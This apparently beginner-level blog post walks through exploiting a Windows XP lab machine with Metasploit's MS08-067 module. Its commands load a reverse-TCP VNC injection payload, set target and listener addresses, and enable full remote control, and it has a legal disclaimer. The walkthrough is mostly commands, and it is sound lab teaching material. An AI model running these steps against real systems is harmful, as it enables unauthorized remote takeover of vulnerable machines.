---
layout: post
title:  "First Hack Part 3 (Searching for Targets and their Weaknesses)"
date:   2018-04-16 14:56:03 -0400
categories: jekyll update
---

<br>[Part 1 (Installing The Virtual Network)][part-1]
<br>[Part 3 (Exploiting The Vulnurability)][part-2]

Legal Disclosure: Don't do this on networks other than your own without written consent from the network administrator. Otherwise, you would be committing an illegal act.

<b>Roadmap</b>

Now comes the fun part. Using a tool called Metasploit in order to break into the Windows XP computer with a VNC. a VNC is simply a window that displays the target desktop. It allows you to control it the same way you are controlling your virtual machine. There are 4 simple steps to this.

Searching for the exploit command

Loading the exploit (Code to exploit the weakness)

Loading the payload (Software used to give you control)

Set the Settings and "pwn the box"

<b>Searching for the Exploit Command</b>

The first thing we need to do is use the code identified in part 2. MS08_067 is the exploit we will use. But how do we load it? We need to get the command from the rapid7 database. Go to...

[https://www.rapid7.com/db][rapid7]

Type "MS08_067" in the search field and make sure "Metasploit Module" is selected in the dropdown box.

Look at the code under "Module Name." We will use that once we load Metasploit

<b>Loading the Exploit and Payload</b>

[Offensive Security: Metasploit Commands][commands]

[Offensive Security: Exploits][exploits]

[Offensive Security: Payloads][payloads]

Open a terminal and load Metasploit's terminal interface with the following command

{% highlight ruby %}
msfconsole
{% endhighlight %}

Use the exploit we found in Rapid7 with the "use" command.

{% highlight ruby %}
use exploit/windows/smb/ms08_067_netapi
{% endhighlight %}

There are many useful payloads. I will recommend we use a reverse TCP payload in order to gain a VNC session. Load the payload with the "set" command.

{% highlight ruby %}
set PAYLOAD windows/vncinject/reverse_tcp
{% endhighlight %}

<b>Settings</b>

We want to see if we have the correct settings. Use the following command.

{% highlight ruby %}
show options
{% endhighlight %}

You should get something that looks like this

![image tooltip](/blog/images/ms08_067/msfconsole_show_options1.JPG)

You may have noticed a few lines are missing. Specifically LHOST and RHOST. LHOST is the local host (your PC) and RHOST is the remote host (target PC)

Let's fill those in with the set command

{% highlight ruby %}
set RHOST 192.168.1.244
#I am using the ip of my own target computer. Use the IP for your own
{% endhighlight %}

Before we fill in LHOST, we need to the the IP of your own Linux machine.

Press Ctrl+Shift+T in order to bring up a new terminal tab

{% highlight ruby %}
sifconfig
{% endhighlight %}

You should get something like this. I highlighted the IP in yellow. Your IP will be in the same spot but most likely different.

![image tooltip](/blog/images/ms08_067/ifconfig.JPG)

{% highlight ruby %}
set LHOST 192.168.1.48
#use the IP you just looked up in ifconfig
{% endhighlight %}

We filled in all the empty fields so we should be good right? Almost. By default, the VNC will only let you spy on the target machine. We want to enable control. Make one more setting.

{% highlight ruby %}
set ViewOnly false
{% endhighlight %}

Run the show options again and make sure you have these settings.

![image tooltip](/blog/images/ms08_067/msfconsole_show_options2.JPG)

<b>Hack It!</b>

Finally, run the command

{% highlight ruby %}
exploit
{% endhighlight %}

Congratulations, you did it!!

![image tooltip](/blog/images/ms08_067/owned.JPG)



[part-1]: MS08_067_Part_1.html
[part-2]: MS08_067_Part_2.html
[rapid7]: https://www.rapid7.com/db
[commands]: https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
[exploits]: https://www.offensive-security.com/metasploit-unleashed/exploits/
[payloads]: https://www.offensive-security.com/metasploit-unleashed/payloads/
